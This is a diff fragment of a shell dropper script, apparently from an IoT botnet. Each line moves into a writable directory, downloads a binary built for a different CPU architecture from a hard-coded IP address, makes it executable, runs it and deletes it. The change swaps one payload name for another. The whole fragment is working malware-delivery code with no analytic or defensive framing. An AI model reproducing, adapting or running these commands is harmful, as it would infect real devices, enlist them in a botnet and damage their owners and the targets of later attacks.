@@ -3,7 +3,7 @@ cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.10
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pl0xmipsel; chmod +x pl0xmipsel; ./pl0xmipsel; rm -rf pl0xmipsel
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pl0xsh4; chmod +x pl0xsh4; ./pl0xsh4; rm -rf pl0xsh4
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pl0xx64; chmod +x pl0xx64; ./pl0xx64; rm -rf pl0xx64
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/rootyphones; chmod +x rootyphones; ./rootyphones; rm -rf rootyphones
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/kittyphones; chmod +x kittyphones; ./kittyphones; rm -rf kittyphones
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pl0xi686; chmod +x pl0xi686; ./pl0xi686; rm -rf pl0xi686
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/pl0xppc; chmod +x pl0xppc; ./pl0xppc; rm -rf pl0xppc
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.112.107/ftp; chmod +x ftp; ./ftp; rm -rf ftp
